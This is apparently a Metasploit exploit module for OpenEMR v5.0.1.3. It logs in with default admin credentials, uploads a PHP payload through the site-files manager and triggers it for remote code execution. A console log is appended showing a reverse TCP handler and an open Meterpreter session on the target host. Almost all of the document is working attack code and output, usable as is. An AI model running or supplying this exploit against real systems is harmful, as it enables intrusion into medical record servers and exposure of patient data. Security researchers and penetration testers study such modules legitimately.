require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'OpenEMR v5.0.1.3 File Upload and Execute',
      'Description'    => %q{
         This module exploits an unrestricted file upload vulnerability in OpenEMR v5.0.1.3.
      },
      'Author'         => [ 'Mario Ceballos' ],
      'License'        => 'BSD_LICENSE',
      'Privileged'     => false,
      'References'     => [[ 'URL', 'https://insecurity.sh/reports/openemr.pdf' ]],
      'Targets'        => [[ 'OpenEMR v5.0.1.3', {}]],
      'Payload'        =>
              {
                       'DisableNops' => true,
                       'Space'       => 6144,
                       'BadChars'    => "`\"' %&x",
              },
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Apr 5 2018'
    ))

    register_options( [ Opt::RPORT(80),
                        OptString.new('USERNAME', [true, 'The HTTP username', 'admin']),
                        OptString.new('PASSWORD', [true, 'The HTTP password', 'admin']),
                        OptString.new('DIRECTORY', [true, 'The OpenEMR Directory', 'openemr-5_0_1_3']),
                      ], self.class )
  end

  def exploit

    user = datastore['USERNAME']
    pass = datastore['PASSWORD']
    dir  = datastore['DIRECTORY']

    login =  "new_login_session_management=1&authProvider=Default&"
    login << "authUser=#{user}&clearPass=#{pass}&languageChoice=1"

    res = send_request_cgi(
      {
        'uri'		=> "/#{dir}/interface/main/main_screen.php",
        'version'	=> '1.1',
        'method'	=> 'POST',
        'encode_params' => false,
        'vars_get' => {
              'auth' => 'login',
              'site' => 'default',
        },
        'data'		=> login,
      }, 5)

     if res and res.code == 302
        openemrid = res.headers['Set-Cookie'].split(',')[1]
	print_status "Login Successful!" 

       page = rand_text_alpha_upper(5) + ".php"
       post_data = Rex::MIME::Message.new
       post_data.add_part("", nil, nil, 'form-data; name="form_filename"')
       post_data.add_part("", nil, nil, 'form-data; name="form_filedata"')
       post_data.add_part("12000000", nil, nil, 'form-data; name="MAX_FILE_SIZE"')
       post_data.add_part(payload.raw, 'application/x-php', nil, "form-data; name=\"form_image\"; filename=\"#{page}\"")
       post_data.add_part("", nil, nil, 'form-data; name="form_dest_filename"')
       post_data.add_part("", 'application/octet-stream', nil, "form-data; name=\"form_education\"; filename=\"\"")
       post_data.add_part("Save", nil, nil, 'form-data; name="bn_save"')
       data = post_data.to_s

       res = send_request_cgi(
         {
           'uri'           => "/#{dir}/interface/super/manage_site_files.php",
           'version'       => '1.1',
           'method'        => 'POST',
           'cookie'        => openemrid,
           'ctype'         => "multipart/form-data; boundary=#{post_data.bound}",
           'encode_params' => false,
           'data'          => data,
         }, 5)
        
       if res and res.code == 200
           print_status "Triggering payload..."
           send_request_raw({'uri' => "/#{dir}/sites/default/images/#{page}",},5)
           handler
       else
           print_error "Exploit Failed..."
        end
     else
        print_error "Login Denied"
     end

  end
end
__END__
msf exploit(mc/openemr_file_upload) > rexploit
[*] Reloading module...

[*] Started reverse TCP handler on 192.168.3.210:4444 
[*] Login Successful!
[*] Triggering payload...
[*] Sending stage (37775 bytes) to 192.168.3.106
[*] Meterpreter session 3 opened (192.168.3.210:4444 -> 192.168.3.106:33864) at 2018-11-20 09:29:46 -0600

meterpreter > pwd
/var/www/html/openemr-5_0_1_3/sites/default/images
meterpreter > 

